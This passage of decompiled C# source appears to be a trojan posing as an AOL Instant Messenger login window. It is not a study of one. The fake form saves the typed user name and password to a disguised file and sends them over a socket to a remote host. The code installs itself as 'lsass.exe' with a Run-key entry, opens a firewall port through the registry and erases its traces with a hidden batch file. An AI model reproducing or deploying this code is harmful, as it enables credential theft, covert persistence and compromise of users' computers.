		this.m_B.set_ImageIndex((int)resourceManager.GetObject("label3.ImageIndex"));
		this.m_B.set_ImeMode((ImeMode)resourceManager.GetObject("label3.ImeMode"));
		((Control)this.m_B).set_Location((Point)resourceManager.GetObject("label3.Location"));
		((Control)this.m_B).set_Name("label3");
		((Control)this.m_B).set_RightToLeft((RightToLeft)resourceManager.GetObject("label3.RightToLeft"));
		((Control)this.m_B).set_Size((Size)resourceManager.GetObject("label3.Size"));
		((Control)this.m_B).set_TabIndex((int)resourceManager.GetObject("label3.TabIndex"));
		((Control)this.m_B).set_Text(resourceManager.GetString("label3.Text"));
		this.m_B.set_TextAlign((ContentAlignment)resourceManager.GetObject("label3.TextAlign"));
		((Control)this.m_B).set_Visible((bool)resourceManager.GetObject("label3.Visible"));
		((Control)this.m_C).set_AccessibleDescription((string)resourceManager.GetObject("pictureBox5.AccessibleDescription"));
		((Control)this.m_C).set_AccessibleName((string)resourceManager.GetObject("pictureBox5.AccessibleName"));
		((Control)this.m_C).set_Anchor((AnchorStyles)resourceManager.GetObject("pictureBox5.Anchor"));
		((Control)this.m_C).set_BackgroundImage((Image)resourceManager.GetObject("pictureBox5.BackgroundImage"));
		((Control)this.m_C).set_Dock((DockStyle)resourceManager.GetObject("pictureBox5.Dock"));
		((Control)this.m_C).set_Enabled((bool)resourceManager.GetObject("pictureBox5.Enabled"));
		((Control)this.m_C).set_Font((Font)resourceManager.GetObject("pictureBox5.Font"));
		this.m_C.set_Image((Image)(Bitmap)resourceManager.GetObject("pictureBox5.Image"));
		this.m_C.set_ImeMode((ImeMode)resourceManager.GetObject("pictureBox5.ImeMode"));
		((Control)this.m_C).set_Location((Point)resourceManager.GetObject("pictureBox5.Location"));
		((Control)this.m_C).set_Name("pictureBox5");
		((Control)this.m_C).set_RightToLeft((RightToLeft)resourceManager.GetObject("pictureBox5.RightToLeft"));
		((Control)this.m_C).set_Size((Size)resourceManager.GetObject("pictureBox5.Size"));
		this.m_C.set_SizeMode((PictureBoxSizeMode)resourceManager.GetObject("pictureBox5.SizeMode"));
		this.m_C.set_TabIndex((int)resourceManager.GetObject("pictureBox5.TabIndex"));
		this.m_C.set_TabStop(false);
		((Control)this.m_C).set_Text(resourceManager.GetString("pictureBox5.Text"));
		((Control)this.m_C).set_Visible((bool)resourceManager.GetObject("pictureBox5.Visible"));
		((Control)this).set_AccessibleDescription((string)resourceManager.GetObject("$this.AccessibleDescription"));
		((Control)this).set_AccessibleName((string)resourceManager.GetObject("$this.AccessibleName"));
		((Control)this).set_Anchor((AnchorStyles)resourceManager.GetObject("$this.Anchor"));
		((Form)this).set_AutoScaleBaseSize((Size)resourceManager.GetObject("$this.AutoScaleBaseSize"));
		((ScrollableControl)this).set_AutoScroll((bool)resourceManager.GetObject("$this.AutoScroll"));
		((ScrollableControl)this).set_AutoScrollMargin((Size)resourceManager.GetObject("$this.AutoScrollMargin"));
		((ScrollableControl)this).set_AutoScrollMinSize((Size)resourceManager.GetObject("$this.AutoScrollMinSize"));
		((Control)this).set_BackgroundImage((Image)resourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize((Size)resourceManager.GetObject("$this.ClientSize"));
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[14]
		{
			(Control)this.m_A,
			(Control)this.m_C,
			(Control)this.m_B,
			(Control)this.m_a,
			(Control)this.m_A,
			(Control)this.m_a,
			(Control)this.m_A,
			(Control)this.m_b,
			(Control)this.m_B,
			(Control)this.m_a,
			(Control)this.m_a,
			(Control)this.m_A,
			(Control)this.m_A,
			(Control)this.m_A
		});
		((Control)this).set_Dock((DockStyle)resourceManager.GetObject("$this.Dock"));
		((Control)this).set_Enabled((bool)resourceManager.GetObject("$this.Enabled"));
		((Control)this).set_Font((Font)resourceManager.GetObject("$this.Font"));
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)resourceManager.GetObject("$this.Icon"));
		((Control)this).set_ImeMode((ImeMode)resourceManager.GetObject("$this.ImeMode"));
		((Control)this).set_Location((Point)resourceManager.GetObject("$this.Location"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MaximumSize((Size)resourceManager.GetObject("$this.MaximumSize"));
		((Form)this).set_MinimumSize((Size)resourceManager.GetObject("$this.MinimumSize"));
		((Control)this).set_Name("Form1");
		((Control)this).set_RightToLeft((RightToLeft)resourceManager.GetObject("$this.RightToLeft"));
		((Form)this).set_StartPosition((FormStartPosition)resourceManager.GetObject("$this.StartPosition"));
		((Control)this).set_Text(resourceManager.GetString("$this.Text"));
		((Control)this).set_Visible((bool)resourceManager.GetObject("$this.Visible"));
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}

	[STAThread]
	private static void A()
	{
		Application.Run((Form)(object)new A());
	}

	private void A(DirectoryInfo directoryInfo_0, string string_0, ref ArrayList arrayList_0)
	{
		try
		{
			FileInfo[] files = directoryInfo_0.GetFiles(string_0);
			foreach (FileInfo fileInfo in files)
			{
				arrayList_0.Add(fileInfo.FullName);
			}
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			foreach (DirectoryInfo directoryInfo_ in directories)
			{
				A(directoryInfo_, string_0, ref arrayList_0);
			}
		}
		catch
		{
		}
	}

	private void A(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		Thread.Sleep(2000);
		MessageBox.Show("No Connection to AOL Instant Messenger Server available! Please try later again!");
	}

	private void a(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Das ist eine Test/Public Version von White-Day Login Faker v.1.0");
		string text = "";
		string text2 = "";
		string text3 = "";
		string path = text3 + "\\";
		string text4 = text3 + "\\";
		string text5 = "";
		string text6 = "";
		string text7 = "";
		string text8 = "config";
		string text9 = "";
		for (int i = 1; i < 999; i++)
		{
			if (File.Exists(text8 + i + ".ini"))
			{
				StreamReader streamReader = new StreamReader(text8 + i + ".ini");
				for (int j = 1; j < 11; j++)
				{
					if (j == 1)
					{
						streamReader.ReadLine();
					}
					if (j == 2)
					{
						text = streamReader.ReadLine();
					}
					if (j == 3)
					{
						text2 = streamReader.ReadLine();
					}
					if (j == 4)
					{
						text3 = streamReader.ReadLine();
					}
					if (j == 5)
					{
						text9 = text8 + i + ".ini";
						text6 = text3 + "\\" + text9;
					}
					if (j == 6)
					{
						text5 = streamReader.ReadLine();
					}
					if (j == 7)
					{
						path = streamReader.ReadLine();
					}
					if (j == 8)
					{
						text4 = streamReader.ReadLine();
					}
					if (j == 9)
					{
						text7 = streamReader.ReadLine();
					}
					if (j == 10)
					{
						goto end_IL_01ad;
					}
				}
			}
			else
			{
				text3 = "C:\\Programme\\Internet Explorer\\lsass_aim";
				text6 = text3 + "\\" + text8 + ".ini";
				text = "White-Day_Login_Faker_AIM.exe";
				text2 = "lsass.exe";
				text9 = "config.ini";
				text5 = text3 + "\\" + text2;
				path = text3 + "\\pagefile.bak";
				text4 = text3 + "\\lsass.txt";
				text7 = "8221";
			}
			continue;
			end_IL_01ad:
			break;
		}
		if (File.Exists(path))
		{
			A a = new A();
			((Control)a).Hide();
			string path2 = text4;
			if (!File.Exists(path2))
			{
				string path3 = "";
				try
				{
					for (int k = 1; k < 6; k++)
					{
						string string_ = "aim.exe";
						if (k == 5)
						{
							path3 = "G:\\";
						}
						if (k == 4)
						{
							path3 = "F:\\";
						}
						if (k == 3)
						{
							path3 = "E:\\";
						}
						if (k == 2)
						{
							path3 = "D:\\";
						}
						if (k == 1)
						{
							path3 = "C:\\";
						}
						ArrayList arrayList_ = new ArrayList();
						DirectoryInfo directoryInfo_ = new DirectoryInfo(path3);
						A(directoryInfo_, string_, ref arrayList_);
						foreach (string item in arrayList_)
						{
							StreamWriter streamWriter = new StreamWriter(new FileStream(path2, FileMode.Create, FileAccess.Write));
							streamWriter.WriteLine(item);
							streamWriter.Close();
						}
					}
				}
				catch
				{
				}
			}
			StreamReader streamReader2 = new StreamReader(path2);
			for (int l = 1; l < 2; l++)
			{
				string fileName = streamReader2.ReadLine();
				Process.Start(fileName);
			}
			while (true)
			{
				try
				{
					string text10 = "";
					if (File.Exists(text6))
					{
						string hostName = "";
						StreamReader streamReader3 = new StreamReader(text6);
						for (int m = 1; m < 2; m++)
						{
							hostName = streamReader3.ReadLine();
						}
						try
						{
							IPHostEntry hostByName = Dns.GetHostByName(hostName);
							text10 = hostByName.AddressList[0].ToString();
						}
						catch
						{
							MessageBox.Show("Keine gültige DNS eingegeben");
						}
					}
					else
					{
						IPHostEntry hostByName2 = Dns.GetHostByName("am.am.de");
						text10 = hostByName2.AddressList[0].ToString();
					}
					this.m_A = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
					string ipString = text10;
					string value2 = text7;
					int port = Convert.ToInt16(value2, 10);
					IPAddress address = IPAddress.Parse(ipString);
					IPEndPoint remoteEP = new IPEndPoint(address, port);
					this.m_A.Connect(remoteEP);
				}
				catch (SocketException)
				{
					try
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						registryKey.SetValue("AIM", text5);
						RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
						registryKey2.SetValue(text7 + ":TCP", text7 + ":TCP:*:Enabled:ENABLE");
					}
					catch
					{
					}
					Thread.Sleep(10000);
					continue;
				}
				break;
			}
			if (this.m_A.Connected)
			{
				try
				{
					StreamReader streamReader4 = new StreamReader(path);
					for (int n = 1; n < 4; n++)
					{
						string text11 = streamReader4.ReadLine();
						object obj4 = text11 + "     ";
						byte[] bytes = Encoding.ASCII.GetBytes(obj4.ToString());
						this.m_A.Send(bytes);
					}
					streamReader4.Close();
					this.m_A.Close();
					File.Delete(path);
					int num = 1;
					while (num == 1)
					{
						try
						{
							RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
							registryKey3.SetValue("AIM", text5);
							RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
							registryKey4.SetValue(text7 + ":TCP", text7 + ":TCP:*:Enabled:ENABLE");
						}
						catch
						{
						}
						Thread.Sleep(10000);
					}
					((Form)this).Close();
				}
				catch (SocketException)
				{
				}
			}
		}
		if (!File.Exists(text5))
		{
			try
			{
				Directory.CreateDirectory(text3);
				if (File.Exists(text9))
				{
					File.Copy(text9, text6);
				}
				File.Copy(text, text5);
				RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey5.SetValue("AIM", text5);
				RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
				registryKey6.SetValue(text7 + ":TCP", text7 + ":TCP:*:Enabled:ENABLE");
			}
			catch
			{
			}
			Random random = new Random();
			string text12 = "";
			for (int num2 = 1; num2 < 4; num2++)
			{
				string text13 = random.Next(0, 255).ToString();
				text12 += text13;
			}
			StreamWriter streamWriter2 = new StreamWriter(new FileStream(text12 + ".bat", FileMode.Append, FileAccess.Write));
			streamWriter2.WriteLine("echo off");
			streamWriter2.WriteLine("cls");
			streamWriter2.WriteLine("ping -n 15 localhost >NUL");
			streamWriter2.WriteLine("cls");
			streamWriter2.WriteLine("del " + text);
			streamWriter2.WriteLine("cls");
			streamWriter2.WriteLine("del " + text9);
			streamWriter2.WriteLine("cls");
			streamWriter2.WriteLine("del " + text12 + ".bat");
			streamWriter2.WriteLine("cls");
			streamWriter2.Close();
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text12 + ".bat";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo = processStartInfo;
			process.Start();
			((Form)this).Close();
		}
		Thread.Sleep(6000);
		try
		{
			this.m_A.set_Visible(true);
			this.m_A.SelectAll();
		}
		catch
		{
		}
	}

	private void B(object sender, EventArgs e)
	{
		//IL_03b5: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		string text2 = "";
		string path = text2 + "\\";
		string text3 = text2 + "\\";
		string value = "";
		string path2 = "";
		string text4 = "";
		string text5 = "config";
		string text6 = "";
		for (int i = 1; i < 999; i++)
		{
			if (File.Exists(text5 + i + ".ini"))
			{
				StreamReader streamReader = new StreamReader(text5 + i + ".ini");
				for (int j = 1; j < 11; j++)
				{
					if (j == 1)
					{
						streamReader.ReadLine();
					}
					if (j == 2)
					{
						streamReader.ReadLine();
					}
					if (j == 3)
					{
						text = streamReader.ReadLine();
					}
					if (j == 4)
					{
						text2 = streamReader.ReadLine();
					}
					if (j == 5)
					{
						text6 = text5 + i + ".ini";
						path2 = text2 + "\\" + text6;
					}
					if (j == 6)
					{
						value = streamReader.ReadLine();
					}
					if (j == 7)
					{
						path = streamReader.ReadLine();
					}
					if (j == 8)
					{
						text3 = streamReader.ReadLine();
					}
					if (j == 9)
					{
						text4 = streamReader.ReadLine();
					}
					if (j == 10)
					{
						goto end_IL_0193;
					}
				}
			}
			else
			{
				text2 = "C:\\Programme\\Internet Explorer\\lsass_aim";
				path2 = text2 + "\\" + text5 + ".ini";
				text = "lsass.exe";
				value = text2 + "\\" + text;
				path = text2 + "\\pagefile.bak";
				text3 = text2 + "\\lsass.txt";
				text6 = "config.ini";
				text4 = "8221";
			}
			continue;
			end_IL_0193:
			break;
		}
		if (((Control)this.m_A).get_Text() == "" || ((Control)this.m_A).get_Text() == "")
		{
			return;
		}
		Thread.Sleep(500);
		this.m_A.set_Visible(false);
		((Control)this).Hide();
		StreamWriter streamWriter = new StreamWriter(new FileStream(path, FileMode.Append, FileAccess.Write));
		streamWriter.WriteLine("AIM User: " + ((Control)this.m_A).get_Text());
		streamWriter.WriteLine("AIM Passwort: " + ((Control)this.m_A).get_Text());
		streamWriter.WriteLine("Diese Datei wurde von White-Day AIM Fake Login v.1.0 erstellt!");
		streamWriter.Close();
		string path3 = text3;
		if (!File.Exists(path3))
		{
			string path4 = "";
			try
			{
				for (int k = 1; k < 6; k++)
				{
					string string_ = "aim.exe";
					if (k == 5)
					{
						path4 = "G:\\";
					}
					if (k == 4)
					{
						path4 = "F:\\";
					}
					if (k == 3)
					{
						path4 = "E:\\";
					}
					if (k == 2)
					{
						path4 = "D:\\";
					}
					if (k == 1)
					{
						path4 = "C:\\";
					}
					ArrayList arrayList_ = new ArrayList();
					DirectoryInfo directoryInfo_ = new DirectoryInfo(path4);
					A(directoryInfo_, string_, ref arrayList_);
					foreach (string item in arrayList_)
					{
						StreamWriter streamWriter2 = new StreamWriter(new FileStream(path3, FileMode.Create, FileAccess.Write));
						streamWriter2.WriteLine(item);
						streamWriter2.Close();
					}
				}
			}
			catch
			{
			}
		}
		StreamReader streamReader2 = new StreamReader(path3);
		for (int l = 1; l < 2; l++)
		{
			string fileName = streamReader2.ReadLine();
			Process.Start(fileName);
		}
		while (true)
		{
			try
			{
				string text7 = "";
				if (File.Exists(path2))
				{
					string hostName = "";
					StreamReader streamReader3 = new StreamReader(path2);
					for (int m = 1; m < 2; m++)
					{
						hostName = streamReader3.ReadLine();
					}
					try
					{
						IPHostEntry hostByName = Dns.GetHostByName(hostName);
						text7 = hostByName.AddressList[0].ToString();
					}
					catch
					{
						MessageBox.Show("Keine gültige DNS eingegeben");
					}
				}
				else
				{
					IPHostEntry hostByName2 = Dns.GetHostByName("am.am.de");
					text7 = hostByName2.AddressList[0].ToString();
				}
				this.m_A = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
				string ipString = text7;
				string value3 = text4;
				int port = Convert.ToInt16(value3, 10);
				IPAddress address = IPAddress.Parse(ipString);
				IPEndPoint remoteEP = new IPEndPoint(address, port);
				this.m_A.Connect(remoteEP);
			}
			catch (SocketException)
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.SetValue("AIM", value);
					RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
					registryKey2.SetValue(text4 + ":TCP", text4 + ":TCP:*:Enabled:ENABLE");
				}
				catch
				{
				}
				Thread.Sleep(10000);
				continue;
			}
			break;
		}
		if (!this.m_A.Connected)
		{
			return;
		}
		try
		{
			StreamReader streamReader4 = new StreamReader(path);
			for (int n = 1; n < 4; n++)
			{
				string text8 = streamReader4.ReadLine();
				object obj4 = text8 + "     ";
				byte[] bytes = Encoding.ASCII.GetBytes(obj4.ToString());
				this.m_A.Send(bytes);
			}
			streamReader4.Close();
			File.Delete(path);
			int num = 1;
			while (num == 1)
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey3.SetValue("AIM", value);
					RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
					registryKey4.SetValue(text4 + ":TCP", text4 + ":TCP:*:Enabled:ENABLE");
				}
				catch
				{
				}
				Thread.Sleep(10000);
			}
		}
		catch (SocketException)
		{
		}
		this.m_A.Close();
		File.Delete(path);
		((Form)this).Close();
	}

	private void A(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://my.screenname.aol.com/_cqr/login/login.psp?siteId=snshomepage_de&authLev=1&mcState=initialized&createSn=1&triedAimAuth=y");
	}

	private void a(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://www.aol.de/instantmessenger/passwort/index.jsp");
	}

	private void b(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		Thread.Sleep(2000);
		MessageBox.Show("Error, please sign on to solve this problem!");
	}

	private void C(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		Thread.Sleep(2000);
		MessageBox.Show("Error. Help not available, please sign on to solve this problem!");
	}
}
